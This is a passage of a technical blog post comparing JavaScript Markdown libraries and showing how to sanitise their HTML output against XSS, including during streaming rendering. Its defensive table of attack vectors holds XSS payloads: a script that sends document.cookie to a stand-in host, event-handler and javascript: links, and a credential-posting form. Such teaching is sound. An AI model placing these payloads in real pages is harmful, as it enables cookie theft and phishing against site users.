---
title: Rendering Markdown in JavaScript without shipping a hole
description: marked, markdown-it, unified, micromark and snarkdown compared, with the render-then-sanitise pattern that keeps XSS out of the HTML you ship
updated: 2026-09-09
date: 2026-07-24
tag: Code
keywords: markdown to html javascript, marked js, markdown it, remark, rehype, unified markdown, react markdown, markdown parser comparison, micromark, snarkdown, markdown-it plugins, rehype-sanitize, dompurify markdown, streaming markdown rendering
---

Three libraries do most of the Markdown-to-HTML work in JavaScript, and they answer the same
question: give me Markdown, hand back HTML. What separates them is shape — what the parse exposes
and where you hook in. Then the part most tutorials skip: what comes back is HTML, and putting it
in a page is not safe.

The choice usually gets made in five minutes, from a search result, and then lived with for four
years. It stops being cheap the first time somebody asks for a table of contents, or for external
links to open in a new tab and internal ones not to, or for a heading id that matches the anchor a
support article already links to. At that point the question is no longer which parser is quickest.
It is whether the library gave you anything to hold on to.

The second thing that ages badly is the input. A renderer pointed at your own documentation is a
rendering problem. The same renderer pointed at a comment box, a pull request description, a file a
customer uploaded or the output of a language model is a security problem, and none of these
libraries solves that for you — the most popular of them says so in its own README.

### TL;DR

Use **marked** when the job is one string in and one string out, and customising means overriding a
few renderer methods. Use **markdown-it** when you want CommonMark conformance plus a plugin for
every extension you will eventually be asked for, and the ability to change one tag's output without
touching the parse. Use **unified** — `remark-parse`, `remark-rehype`, `rehype-stringify` — when you
need the document as a tree, because it is the only one of the three where transforming the content
is not string surgery. **micromark** is the parser underneath remark and is the right answer only if
you are building the layer above it; **snarkdown** is a kilobyte and a set of compromises. Whichever
you pick, sanitise the HTML afterwards with a tool whose only job is sanitising.

## Three shapes, one job

| Library | Best for | Spec position | How you extend it | In a browser | Licence |
| --- | --- | --- | --- | --- | --- |
| marked | One function, few moving parts | GFM on by default (`gfm: true`); no formal conformance claim in its README | `marked.use()` with a renderer, a tokenizer, custom extensions, hooks and `walkTokens` | Yes — browser, Node and a CLI, all from one package | Free, MIT |
| markdown-it | Correctness, and a plugin for everything | States 100% CommonMark support, with a `commonmark` preset for strict mode | `.use(plugin)`, `.enable()` / `.disable()` per rule, and overriding `md.renderer.rules[name]` | Yes | Free, MIT |
| unified (remark + rehype) | Transforming the document, not only rendering it | CommonMark through micromark; GFM added by `remark-gfm` | Plugins that walk two syntax trees, mdast for Markdown and hast for HTML | Yes, and ESM only | Free, MIT |
| micromark | Building a parser layer, not an application | States 100% CommonMark compliance and is the engine inside remark | Syntax extensions and HTML extensions, written against character codes and tokens | Yes | Free, MIT |
| snarkdown | A kilobyte, when you accept what it costs | No compliance claim; tables are not supported | Effectively not extensible — one exported function | Yes | Free, MIT |

(Licences, options and compliance claims checked on marked.js.org, github.com and cdn.jsdelivr.net,
9 September 2026. There are no benchmark numbers in that table on purpose: speed is the thing every
comparison measures and the thing that decides fewest of these choices.)

marked is the smallest thing that works. Call `marked.parse()`, get HTML. Customising means
replacing renderer methods — the one that emits a heading, the one that emits a link — or
registering an extension for new syntax. Most jobs never reach that ceiling.

markdown-it parses to a flat token stream and renders that. The tokens are documented, so the
plugin ecosystem is large and the plugins compose: anchors, footnotes, attributes, containers. To
change the output rather than the syntax, override the rule for one token type.

The unified pipeline is different in kind. `remark-parse` produces mdast, a Markdown syntax tree;
`remark-rehype` converts it to hast, an HTML tree; `rehype-stringify` prints it. Every step between
is a plugin walking a real tree — the only one of the three where you can collect every heading, or
rewrite relative image paths, without a regex.

Two more are worth knowing about, at opposite ends. micromark is the parser remark is built on: it
reads Markdown as character codes and emits concrete tokens with positions, and it claims full
CommonMark compliance. You would use it directly to build a tool over Markdown — a linter, a
formatter, a syntax highlighter for an editor — rather than to render a page, because on its own it
gives you tokens and a compiler, not a document you can walk. snarkdown is the other end: a single
regular-expression-driven function, described by its own README as 1kb of gzipped ES3, with no
tables and no sanitising (checked on github.com, 9 September 2026). It exists for a widget where the
whole point is that nothing else ships.

## The libraries in depth

### marked — the options that matter

marked's API is one call and an options object, and only a handful of the options change what the
HTML looks like.

| Option | Default | What it does |
| --- | --- | --- |
| `gfm` | `true` | GitHub Flavored Markdown: tables, strikethrough, task lists, autolinks |
| `breaks` | `false` | A single newline becomes a `<br>`, the way a GitHub comment behaves |
| `pedantic` | `false` | Follows the original `markdown.pl`, bugs included, and gives up GFM to do it |
| `async` | `false` | `walkTokens` may be asynchronous and `marked.parse()` returns a promise |
| `silent` | `false` | Errors come back as a string instead of throwing |
| `renderer` | a `Renderer` | The functions that turn each token into HTML |
| `tokenizer` | a `Tokenizer` | The functions that turn source text into tokens |
| `walkTokens` | `null` | Called for every token, children before siblings |

(Checked on marked.js.org, 9 September 2026.)

`breaks` is the one people get wrong. Markdown's rule is that a single newline is a space and a
blank line is a paragraph, which is correct for prose and wrong for anything typed into a message
box, where a person pressing Return expects a line to end. Turning `breaks` on is a decision about
your users, not about the specification. `pedantic` is a compatibility switch for documents written against the 2004 implementation, and it is not what you
want for anything written this decade.

The bigger trap is the options that are no longer there. marked has moved a long list of behaviours
out of the core and into separate packages, and a snippet copied from an old answer will pass an
option that is silently ignored rather than rejected.

| Removed option | Where it went |
| --- | --- |
| `sanitize`, `sanitizer` | Removed in favour of a real sanitiser: DOMPurify, sanitize-html or insane |
| `highlight`, `langPrefix` | `marked-highlight` |
| `headerIds`, `headerPrefix` | `marked-gfm-heading-id` |
| `mangle` | `marked-mangle` |
| `smartypants` | `marked-smartypants` |
| `baseUrl` | `marked-base-url` |
| `xhtml` | `marked-xhtml` |

(Checked on marked.js.org, 9 September 2026.) The first row is the important one. If your code
passes `sanitize: true` and you believe that is your defence, you have no defence.

Customising output means overriding renderer methods. Each one receives the token and returns a
string, and `this.parser` is available for rendering the token's children.

```js
import { marked } from 'marked';

const slug = (text) =>
  `doc-${text.toLowerCase().trim().replace(/[^\w]+/g, '-').replace(/^-|-$/g, '')}`;

marked.use({
  renderer: {
    heading({ tokens, depth }) {
      const text = this.parser.parseInline(tokens);
      return `<h${depth} id="${slug(text)}">${text}</h${depth}>\n`;
    },
  },
});
```

The tokenizer is the same idea one stage earlier: override the function that recognises a piece of
syntax, return `false` and marked falls through to the default. Use the renderer to change how
something is emitted and the tokenizer to change what counts as that thing in the first place.

For syntax marked does not know about, register an extension: a `name`, a `level` of `block` or
`inline`, a `start` that says where the token might begin, a `tokenizer` that produces it and a
`renderer` that prints it. Hooks sit outside the parse entirely — `preprocess` sees the Markdown
before tokenising, `postprocess` sees the HTML afterwards, and `processAllTokens` sees the whole
token array in between. A `preprocess` hook is the tidiest place to strip YAML front matter, which
otherwise renders as a paragraph of `key: value` lines at the top of the page.

Syntax highlighting is now `marked-highlight`, which wraps a highlighter of your choosing and adds
the class names to the `<code>` element.

```js
import { Marked } from 'marked';
import { markedHighlight } from 'marked-highlight';
import hljs from 'highlight.js';

const marked = new Marked(
  markedHighlight({
    langPrefix: 'hljs language-',
    highlight(code, lang) {
      const language = hljs.getLanguage(lang) ? lang : 'plaintext';
      return hljs.highlight(code, { language }).value;
    },
  }),
);
```

Two things to notice. `langPrefix` defaults to `language-`, so a `js` fence produces
`class="language-js"` — and whatever class your stylesheet expects has to match, which is the usual
reason highlighting is applied and invisible. And the markup the highlighter emits is `<span>`
elements with classes, which your sanitiser has to allow or it will strip the highlighting back out
after you paid for it. [What code blocks need on the page](/blog/code-blocks-in-markdown) covers the
rest of that. Asynchronous highlighters work if you set `async: true` and await the parse.
(`marked-highlight` is free and MIT licensed; its `langPrefix` default and its async support checked
on github.com, 9 September 2026.)

marked is MIT licensed, runs in a browser, in Node and from its own CLI, and its README says
plainly that it does not sanitise its output (checked on github.com, 9 September 2026).

### markdown-it — presets, rules and the plugin ecosystem

markdown-it parses to a flat token stream and renders that stream, and both halves are open. It
starts from a preset, and the presets differ in ways that matter more than their names suggest.

| Preset | `html` | `maxNesting` | Rules enabled |
| --- | --- | --- | --- |
| `'default'` (or nothing) | `false` | `100` | Everything markdown-it implements, including tables and strikethrough |
| `'commonmark'` | `true` | `20` | Strict CommonMark, nothing beyond it |
| `'zero'` | `false` | `20` | Paragraphs and text only — you enable the rest by name |

(Read from the preset files on cdn.jsdelivr.net, 9 September 2026.)

Read the middle column again. `new MarkdownIt('commonmark')` turns raw HTML **on**, because the
CommonMark specification says raw HTML passes through. Asking for the strictest preset makes your
renderer less safe, not more, and that is a genuinely surprising result to arrive at by choosing the
option that sounds most rigorous.

The `zero` preset is the opposite and is underused. It enables `paragraph`, `text` and the joining
rules, and nothing else; you then call `md.enable(['emphasis', 'link', 'backticks'])` and have a
renderer that provably cannot produce a heading or a table. For a display name, a commit message or
a one-line comment field, that is a much better answer than a full parser followed by an aggressive
sanitiser.

The options on top of a preset:

| Option | Default | What it does |
| --- | --- | --- |
| `html` | `false` | Passes raw HTML through instead of escaping it |
| `xhtmlOut` | `false` | Emits `<br />` rather than `<br>` |
| `breaks` | `false` | A single newline becomes a `<br>` |
| `langPrefix` | `'language-'` | Class prefix on fenced code blocks |
| `linkify` | `false` | Turns bare URLs in the text into links |
| `typographer` | `false` | Smart quotes, dashes and other replacements |
| `quotes` | curly quotes | Which quote characters `typographer` substitutes |
| `highlight` | `null` | A function that returns highlighted HTML for a code block |
| `maxNesting` | `100` (`20` in the strict presets) | Recursion limit, to stop a crafted document exhausting the stack |

(Defaults read from the same preset files on cdn.jsdelivr.net, 9 September 2026.)

`linkify` is the one to think about before you enable it. It rewrites text the author did not mark
up as a link, which is convenient in a chat message and wrong in documentation where
`example.com/path` inside a sentence was meant to be read, not clicked. `typographer` is similar:
it changes the characters in your text, which is lovely in an essay and destructive in a document
where somebody typed `--` because it meant something. Neither is on by default, and both are worth
a decision rather than a default.

`maxNesting` is not cosmetic. Deeply nested emphasis or blockquotes are a classic denial-of-service
input for a recursive parser, and a limit is what stops a 4 KB file from taking a request thread
with it.

The plugin ecosystem is the real reason to choose markdown-it. Its README points at the
`markdown-it-plugin` keyword on npm for the community-written ones (checked on github.com,
9 September 2026), and they compose, because they all extend the same documented rule chain:
footnotes, definition lists, containers (`::: warning`), attributes, anchors, table of contents,
task lists, abbreviations, emoji. Where marked asks you to write an extension, markdown-it
usually has one, and adding it is one `.use()` call. Quality varies, and a plugin that has not been
updated since the last major version is a real cost — check that before you build on one.

To change output rather than syntax, override a renderer rule. This is the pattern for adding a
class or an attribute, and it is documented on the project's own architecture page:

```js
const defaultRender = md.renderer.rules.link_open || function (tokens, idx, options, env, self) {
  return self.renderToken(tokens, idx, options);
};

md.renderer.rules.link_open = function (tokens, idx, options, env, self) {
  tokens[idx].attrSet('target', '_blank');
  tokens[idx].attrSet('rel', 'noopener noreferrer');
  return defaultRender(tokens, idx, options, env, self);
};
```

(Pattern from the markdown-it architecture documentation, checked on github.com, 9 September 2026;
the `rel` line is the addition you want if you are going to open a link in a new tab at all.) Keep
the reference to the previous rule and call it. Overriding without falling through is how people
lose the `title` attribute and never notice, because nothing errors — the attribute just stops
appearing.

markdown-it is free and MIT licensed, and runs in a browser. VS Code's own documentation says its
Markdown preview targets CommonMark using markdown-it (checked on code.visualstudio.com,
9 September 2026), which is a fair endorsement of its conformance and the reason a document that
previews correctly in your editor is a good sign and not a guarantee.

### unified — two trees and the plugins between them

The unified pipeline is not a parser with hooks. It is a sequence of small packages, each of which
transforms a tree, and understanding it means understanding that there are two trees.

**mdast** is the Markdown tree. Its nodes are the things Markdown has: `heading`, `list`,
`listItem`, `link`, `image`, `code`, `blockquote`, `text`. **hast** is the HTML tree. Its nodes are
`element`, `text` and `comment`, with tag names and properties. A heading in mdast has a `depth` of
2; the same heading in hast is an `element` with `tagName: 'h2'`. Anything you want to do in terms
of *the document* — collect the headings, check that every link resolves, rewrite relative image
paths, enforce that every image has alt text — is an mdast job. Anything you want to do in terms of
*the markup* — add a class, wrap tables in a scrolling container, add `loading="lazy"` — is a hast
job. Choosing the wrong tree is the most common reason a unified plugin fights you.

| Step | Package | What comes out |
| --- | --- | --- |
| Parse | `remark-parse` | mdast |
| Extend the syntax | `remark-gfm`, `remark-frontmatter`, `remark-math` | mdast |
| Transform the content | your own plugin, `unist-util-visit` | mdast |
| Bridge | `remark-rehype` | hast — raw HTML is dropped unless you pass `allowDangerousHtml` |
| Re-parse embedded HTML | `rehype-raw` | hast with that HTML as real nodes |
| Sanitise | `rehype-sanitize` | hast, filtered against a schema |
| Serialise | `rehype-stringify` | an HTML string |

A full pipeline that accepts raw HTML and survives it looks like this:

```js
import { unified } from 'unified';
import remarkParse from 'remark-parse';
import remarkGfm from 'remark-gfm';
import remarkRehype from 'remark-rehype';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize from 'rehype-sanitize';
import rehypeStringify from 'rehype-stringify';

const processor = unified()
  .use(remarkParse)
  .use(remarkGfm)
  .use(remarkRehype, { allowDangerousHtml: true })
  .use(rehypeRaw)
  .use(rehypeSanitize)
  .use(rehypeStringify);

const html = String(await processor.process(markdown));
```

The order is the whole security model. `remark-rehype` drops raw HTML by default, which is safe and
usually not what you want; `allowDangerousHtml` keeps it as a raw node, `rehype-raw` parses it into
real elements the way a browser would, and `rehype-sanitize` then filters those elements against a
schema. The project's own guidance is to use it "after the last unsafe thing" (rehype-sanitize
README, checked on github.com, 9 September 2026) — put a plugin that injects markup after the
sanitiser and you have put it outside the sanitiser. `rehype-sanitize` defaults to a GitHub-style
schema, which is a sensible starting point and a deliberate one: it is the set of tags GitHub itself
decided to allow in a README.

`remark-gfm` adds five things and it is worth naming them, because each is a specific silent
failure if it is missing: autolink literals, footnotes, strikethrough, tables and task lists. It is
MIT licensed, like the rest (checked on github.com, 9 September 2026). Which of those your files
need is a question about your files, and the flavour differences behind it are worth reading once.

The reason to take on all this machinery is the middle of the table. A plugin is a function that
returns a transformer, and a transformer is handed the tree:

```js
import { visit } from 'unist-util-visit';

const rewriteRelativeImages = (base) => () => (tree) => {
  visit(tree, 'image', (node) => {
    if (!/^[a-z][a-z0-9+.-]*:|^\/\//i.test(node.url)) {
      node.url = new URL(node.url, base).href;
    }
  });
};
```

That is nine lines, it is correct for every image in the document including the ones inside link
text and table cells, and there is no version of it in marked or markdown-it that does not involve
either intercepting a renderer method one node at a time or running a regular expression over
finished HTML. When the task is "do something to every X in the document", a tree is not a heavier
answer, it is the only answer that does not eventually break on a case you did not think of.

The costs are real and they are covered further down. One of them is worth flagging here: the
unified packages state that they are ESM only (checked on github.com, 9 September 2026), which is a
plain blocker in an older CommonJS build that cannot use a dynamic `import()`.

### react-markdown — the pipeline, rendered as components

In React, `react-markdown` sits on the unified pipeline and renders React elements rather than an
HTML string, so no `dangerouslySetInnerHTML` is involved. Its README states that it is safe by
default and builds a virtual DOM from the syntax tree, so React patches only what changed (checked
on github.com, 9 September 2026). It is MIT licensed.

```jsx
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

<Markdown
  remarkPlugins={[remarkGfm]}
  components={{
    a: ({ href, children }) => <Link to={href}>{children}</Link>,
    code: CodeBlock,
  }}
>
  {text}
</Markdown>;
```

The `components` prop is the part that earns it. Every HTML element the pipeline would have produced
can be replaced by one of yours, so a link becomes your router's link, a code fence becomes your
highlighted block with a copy button, and an image becomes your lazy-loading image component —
without generating HTML and parsing it back. `remarkPlugins` and `rehypePlugins` take the same
plugins as any other unified pipeline, with options passed as `[[plugin, options]]`.

Two safety notes, both from the project's own documentation. Raw HTML in the source is ignored
unless you add `rehype-raw`, and its guidance is to do that only if you trust the Markdown; adding
`rehype-sanitize` alongside is the answer when you do not. And `urlTransform` — the hook that
decides what a link or image URL becomes — is the one place you can reintroduce an XSS hole in an
otherwise safe component, by overriding it with something that lets `javascript:` through.

### MDX — a different thing entirely

MDX looks like the next step up from react-markdown and it is not on the same axis at all. MDX is a
file format that combines Markdown with JSX and ESM `import` and `export` statements, and it
compiles to a JavaScript component (checked on mdxjs.com, 9 September 2026). The output is code.

That distinction decides everything about where it belongs. A Markdown renderer takes text at
runtime and produces markup; MDX takes a source file at build time and produces a module that runs.
Sanitising is not a step in an MDX pipeline because there is nothing to sanitise — the file was
allowed to execute by design. MDX is the right tool for documentation and marketing pages that live
in your repository and need interactive components inside the prose, which is why documentation
frameworks reach for it — Docusaurus compiles both `.md` and `.mdx` with the MDX compiler (checked
on docusaurus.io, 9 September 2026). It is categorically the wrong tool for any content that
arrives from a user, a customer, an API or a model. If the input is not written by somebody with
commit access, MDX is not in the running, and no configuration flag changes that.

## Which one is the better answer

The question that separates them is not speed, it is whether you will ever need the document as
data. For trusted Markdown rendered into a page and nothing else, marked or markdown-it is enough.
For a table of contents, link checking or any transform that depends on structure, remark and rehype
are the right answer, and the other two turn into string surgery. What it costs to guess that wrong
in the other direction gets a section of its own further down.

Their defaults differ in dialect, which shows up as missing output, not an error. marked has
GitHub Flavored Markdown behind a `gfm` option, on by default. markdown-it enables tables and
strikethrough in its default preset but leaves task lists to a plugin. unified takes the lot from
`remark-gfm`. If a document arrives missing its tables or its task lists, check the dialect first —
see [CommonMark, GFM and the flavours](/blog/commonmark-gfm-and-the-flavours).

Said as a lookup table, because most of these decisions are one line long:

| What you are building | Reach for |
| --- | --- |
| A comment box, a preview pane, a chat bubble | marked, with a sanitiser |
| A README rendered in your own app | marked or markdown-it, whichever is already there |
| A documentation build that adds anchors, containers and footnotes | markdown-it, and its plugins |
| A single-line field: a display name, a commit subject | markdown-it with the `zero` preset and three rules enabled |
| A table of contents, link checking, house-style linting | unified, on mdast |
| Rewriting URLs, adding classes, wrapping elements | unified, on hast |
| A React application | react-markdown, with `components` |
| Prose with interactive components, written by your own team | MDX, at build time |
| A widget where the bundle is the constraint | snarkdown, knowing what it does not do |
| A linter or formatter over Markdown itself | micromark, or mdast directly |

## The hole: parsing is not sanitising

Markdown allows raw HTML by design, so any parser honouring the spec passes
`<img src=x onerror=alert(1)>` straight through to your page. marked used to carry a `sanitize`
option; it was deprecated and then removed in favour of a dedicated sanitiser. markdown-it defaults
to `html: false`, which closes the widest door, but a link destination is still an attacker's
input.

The three libraries take three positions on this, and none of them is "we will handle it":

| | marked | markdown-it | unified (remark + rehype) |
| --- | --- | --- | --- |
| Output | An HTML string | An HTML string, via tokens | A tree, stringified at the end |
| Raw HTML | Passed through | Escaped by default (`html: false`), passed through in the `commonmark` preset | Dropped unless `allowDangerousHtml` and `rehype-raw` |
| Sanitising | None | None | `rehype-sanitize`, if you add it |
| What the project says | Use DOMPurify, sanitize-html or insane on the output HTML | Nothing is escaped once you set `html: true` — and the `commonmark` preset sets it | `allowDangerousHtml` is dangerous; use `rehype-sanitize` after it |

So: render, then sanitise with a tool whose only job is sanitising, always in that order.

The reason the order is not negotiable is that sanitising Markdown source does not work. Markdown
has too many ways to spell the same output — reference links, entity escapes, autolinks, HTML
comments — so a filter over the source is a filter over one spelling. The HTML is the only
representation where the thing you are deciding about is unambiguous, because it is the thing the
browser will actually be handed.

What a sanitiser has to stop is a longer list than most people hold in their heads:

| Vector | What it looks like | What stops it |
| --- | --- | --- |
| Script element | `<script>fetch('//x/'+document.cookie)</script>` | `script` is not on the tag allow-list |
| Event handler attribute | `<img src=x onerror=alert(1)>` | `on*` is not on the attribute allow-list |
| `javascript:` URL | `[click me](javascript:alert(1))` | A scheme allow-list on `href` and `src` |
| `data:` URL carrying markup | `<iframe src="data:text/html,<script>…">` | `iframe` off; scheme allow-list on `src` |
| SVG with script or handlers | `<svg><script>…</script></svg>` | SVG off unless you genuinely need inline SVG |
| Inline style and CSS that fetches | `<div style="background:url(//x)">` | Drop `style`, keep `class` |
| Form posting somewhere else | `<form action="//x"><input name=pw>` | `form`, `input`, `button` off the list |
| `<base>` rewriting every relative link | `<base href="//x/">` | `base` off the list |
| `meta refresh` redirecting the page | `<meta http-equiv=refresh content=…>` | `meta` off the list |
| DOM clobbering through `id` or `name` | `<a id="config">` shadowing a global | Prefix ids, or strip them |
| Nesting deep enough to exhaust the stack | Hundreds of nested blockquotes | A parser nesting limit, before the sanitiser |

The full case for building that as an allow-list rather than a block-list is a separate piece; the
short version is that a block-list is a list of the attacks somebody has already thought of.

### Which sanitiser, and where it belongs

| Sanitiser | Runs where | Needs a DOM | Configured with | Licence |
| --- | --- | --- | --- | --- |
| DOMPurify | Browser natively; Node with jsdom | Yes | `ALLOWED_TAGS`, `ALLOWED_ATTR`, `USE_PROFILES`, hooks | Free, Apache-2.0 or MPL-2.0 |
| sanitize-html | Node, and bundled for the browser | No — it parses with htmlparser2 | `allowedTags`, `allowedAttributes`, `allowedSchemes`, `transformTags` | Free, MIT |
| rehype-sanitize | Anywhere unified runs | No — it filters hast | A schema, GitHub-style by default | Free, MIT |

(Licences and configuration options checked on github.com, 9 September 2026. sanitize-html's
standalone repository was archived in February 2026 and the package moved into the ApostropheCMS
monorepo, which is worth knowing before you file an issue against the old one.)

Pick by where the code runs, not by reputation. DOMPurify is the right answer in a browser, where
it uses the browser's own parser and therefore sees exactly what the browser will see — including
the mangled recovery a real parser performs on broken markup, which is where a string-matching
filter loses. It has hooks, and `SANITIZE_NAMED_PROPS` for DOM clobbering. rehype-sanitize is the
right answer if you already have a unified pipeline, because it filters the tree in place and there
is never a moment when unsafe HTML exists as a string. sanitize-html is the right answer when you
need one implementation that behaves identically in Node and the browser without a DOM
implementation underneath it.

## Render, then sanitise, in the browser

DOMPurify is the standard choice. Give it an explicit allow-list rather than the default: the
allow-list is the document format you have decided to support.

```js
import { marked } from 'marked';
import DOMPurify from 'dompurify';

export const ALLOWED_TAGS = [
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'br', 'hr', 'strong', 'em', 'del',
  'ul', 'ol', 'li', 'blockquote', 'pre', 'code', 'table', 'thead', 'tbody',
  'tr', 'th', 'td', 'a', 'img', 'input',
];

export const ALLOWED_ATTR = [
  'href', 'src', 'alt', 'title', 'id', 'class', 'target', 'rel',
  'type', 'checked', 'disabled', 'colspan', 'rowspan',
];

export function render(markdown) {
  const html = marked.parse(markdown, { gfm: true });
  return DOMPurify.sanitize(html, { ALLOWED_TAGS, ALLOWED_ATTR });
}
```

Keep both arrays in one module and export them. The moment the same document is rendered somewhere
else, they have to match exactly.

### The same allow-list on the server

DOMPurify needs a real DOM and the server has none. A poor stand-in is worse than nothing: with no
usable DOM, DOMPurify returns the input unchanged instead of throwing, script tag included. Either
give it jsdom, or use a sanitiser that parses the HTML itself, like `xss`.

```js
import { marked } from 'marked';
import { FilterXSS } from 'xss';
import { ALLOWED_ATTR, ALLOWED_TAGS } from './allow-list.js';

const filter = new FilterXSS({
  whiteList: Object.fromEntries(ALLOWED_TAGS.map((tag) => [tag, [...ALLOWED_ATTR]])),
  stripIgnoreTag: true,
  stripIgnoreTagBody: ['script', 'style', 'iframe', 'object', 'embed'],
});

export const render = (markdown) =>
  filter.process(marked.parse(markdown, { gfm: true }));
```

`stripIgnoreTag` removes an unknown tag rather than escaping it, which is the default;
`stripIgnoreTagBody` takes its contents too, so a removed `<script>` leaves no source behind. The
`xss` package is free and MIT licensed, and parses the HTML itself rather than asking for a DOM,
which is what makes it usable in a function with no jsdom in it (`FilterXSS`, `whiteList`,
`stripIgnoreTag` and `stripIgnoreTagBody` checked on github.com, 9 September 2026).

This is how TransformPipe is built: marked for the parse, DOMPurify in the browser, the `xss` package on the
server, one allow-list imported by both, so a document reads the same in the app and on a shared
page. One detail worth stealing: heading ids get a `doc-` prefix. An id becomes a named property on
`window`, and DOMPurify strips ids that look like clobbering risks while a parser-based sanitiser
keeps them — the prefix ends both problems. The case for allow-lists is in
[sanitising Markdown safely](/blog/sanitising-markdown-safely); the same two steps in Python are in
[Markdown to HTML in Python](/blog/markdown-to-html-in-python).

## Rendering model output as it streams

Half the Markdown rendered in a browser now arrives a few characters at a time, from a model, over a
stream. Every naive approach to this is the same approach: append the chunk to a buffer, re-render
the whole buffer, set `innerHTML`. It works in a demo and it fails in four specific ways.

**The document is syntactically invalid most of the time.** Markdown has no partial parse. A buffer
ending in a fence opener means everything after it is a code block, so a table arriving inside a
fenced example renders as code, then as a table, then as code again as the closing fence lands. A
half-typed `[label](htt` is literal text one frame and a link the next. A table whose delimiter row
has not arrived yet is a paragraph of pipe characters. A single `*` at the end of the buffer is a
literal asterisk until its partner appears and the rest of the paragraph turns italic. None of this
is a parser bug — the parser is correctly rendering a document that is genuinely incomplete.

**Replacing `innerHTML` every frame destroys the page's state.** Text selection is lost, an open
`<details>` closes, focus moves, and a user scrolled up to read something is yanked back down. It
is also the most expensive thing you can do per token, because you are throwing away a DOM you are
about to rebuild almost identically.

**The cost is quadratic.** Re-parsing and re-sanitising the whole buffer on every chunk means the
work per chunk grows with the length of the answer. A short reply is fine; a two-thousand-word one
with a hundred chunks is the last hundred renders each doing nearly all the work of the final one.

**It is easy to skip sanitising on the interim renders.** Sanitising only the final HTML is a hole
with a timer on it: every frame before the last one put unsanitised HTML into the page, and an
`onerror` handler fires the moment it is parsed, not when the stream ends.

What works instead is a small set of rules:

1. **Render on a clock, not on a chunk.** Coalesce chunks and render at most once per animation
   frame, or every 50 to 100 milliseconds. The text arrives faster than anybody reads it.
2. **Split the buffer into settled and live.** Everything up to the last blank line that is not
   inside an open fence will not change. Render that once, keep it in the DOM, and only re-render
   the tail after it. This turns the quadratic cost back into a linear one.
3. **Track fence state yourself.** Count the fence openers in the buffer; if the count is odd, you
   are inside a code block. Either close it for the interim render or render the tail as plain
   `<pre>` until the real closing fence arrives. Either is steadier than letting the parser guess.
4. **Sanitise every render, not the last one.** The allow-list costs microseconds against a tail
   that is a few hundred characters. There is no version of this where a partial render is exempt.
5. **Prefer a component renderer if you are in React.** `react-markdown` reconciles a virtual DOM
   against the previous one and patches the difference, which is precisely the problem streaming
   creates, and it is why it holds up under a stream where a raw `innerHTML` loop does not.
6. **Do not switch to a syntax tree expecting it to help.** unified re-parses from scratch too. A
   tree buys you transforms, not incremental parsing.

When the stream ends and you have the final text, render it once more from the top, cleanly. That
last render is the one that gets saved, copied or exported, and it should not carry the compromises
the live one needed —
[turning model output into a page somebody can read](/blog/ai-output-to-a-shareable-page) is a
different job from displaying it as it arrives.

## Where a syntax tree is the wrong answer

The unified pipeline is the most capable option here and recommending it by default is the most
common mistake in this subject. It costs more than its advocates say, in four ways.

**It is seven dependencies before you write a line.** `unified`, `remark-parse`, `remark-gfm`,
`remark-rehype`, `rehype-raw`, `rehype-sanitize`, `rehype-stringify` — each with its own release
cadence, its own changelog and its own major version that will eventually move without the others.
marked is one package. In an application with a security review, a supply-chain policy or a
lockfile somebody actually reads, seven against one is a number that gets raised.

**It is ESM only.** The packages say so themselves. In a modern build that is a non-issue; in a
CommonJS service, an older bundler or a test runner configured years ago, it is a day of work that
has nothing to do with Markdown.

**It is more to resolve and evaluate at import time.** Seven packages and their own dependencies
have to be found and run before the first document is parsed, where marked is one. We have not
measured the difference and would not ask you to trust our number if we had; the shape of the cost
is what matters. On a long-running server it is paid once and vanishes; in a serverless function it
is paid on every cold start, per region, forever.

**It has a real learning curve for a small first task.** Adding a class to every `<h2>` means
knowing that this is a hast job, not an mdast one, that you want a plugin returning a transformer,
that `unist-util-visit` is a separate package, and that node properties are `properties` with
`className` as an array. The equivalent markdown-it renderer rule is four lines and needs one
concept. If your list of transforms is "add ids to headings" and "add `rel` to external links",
both other libraries do it without a tree, and you will have installed a compiler to change two
strings.

The reverse is also true, and it is the failure this article exists to warn about in the other
direction: if you find yourself running a regular expression over rendered HTML — replacing `<h2>`,
matching `<a href="` , counting `<img` — you needed the tree and you built a worse one. HTML is not
a regular language, and every one of those replacements is correct until somebody writes a code
block containing the string you are matching.

The honest position is that most pages render one document, once, and never transform it. For those
pages the pipeline is setup code you read forever for no gain, and the right answer is the small
library plus a sanitiser. Reach for unified when you can name the transform, not when you suspect
you might want one.

## How to choose

1. **Decide whether you will transform the document or only render it.** If a transform exists
   anywhere in your requirements, choose a tree now, because retrofitting one means rewriting every
   customisation you made against tokens or renderer methods.
2. **Match the flavour to the files you actually have.** Convert a real document — one with a
   table, a task list and a footnote — before you commit, because a missing extension does not
   error, it renders your table as a paragraph of pipes.
3. **Pick the sanitiser before the parser.** The sanitiser has to run everywhere the parser runs,
   and DOMPurify without a DOM returns your input unchanged, so this constraint decides more about
   the shape of your code than the parser choice does.
4. **Count the runtimes.** Rendering in the browser and on the server means one allow-list imported
   by both, and a difference between the two shows up as a document that looks different when
   shared than it did when written — which reads as data loss to the person who wrote it.
5. **Name who writes the input.** If it is your own team with commit access, MDX and raw HTML are
   available to you. If it is anybody else, they are not, and no amount of care in configuration
   changes that answer.
6. **Look at what you will have to override.** Write down the four things you already know you need
   — heading ids, external link handling, code highlighting, image lazy-loading — and check each
   one against the library's extension points before choosing, not after.
7. **Test with a hostile file, not a README.** A document containing `<script>`, an `onerror`
   attribute, a `javascript:` link and a `<base>` tag takes a minute to write and tells you more
   about your pipeline than a week of rendering your own documentation.

## What to do with this

Write the allow-list before the renderer, and call the sanitiser in the same function as the parse,
so nobody can reach one without the other. Serve user-supplied output under a content security
policy as well: `script-src 'none'` costs nothing on a page that is only ever a document. If the
input is a Word file rather than Markdown, that is a different library and a different set of
failures — [mammoth and the other docx parsers](/blog/mammoth-js-and-docx-parsers) cover it. Then
pick by the shape of the problem rather than the popularity of the answer: marked for a string,
markdown-it for a plugin, unified for a tree, react-markdown for components, and a dedicated
sanitiser in all four cases. If you needed the HTML once rather than a library in your bundle,
[this conversion](/) runs the same two steps in your browser and hands back a self-contained file.

## FAQ

### Which is faster, marked or markdown-it?

We have not run a benchmark and you should not choose on somebody else's. Both are mature parsers
written for the same job, and in any interactive use — a preview pane, a comment box, one page — the
difference is not what you will notice. It becomes worth measuring when you are rendering thousands
of documents in a build, and at that point measure your own documents, because the answer depends on
what is in them rather than on a number from a repository README.

### Is marked safe to use on untrusted Markdown?

Not on its own. Its README says outright that it does not sanitise its output and directs you to
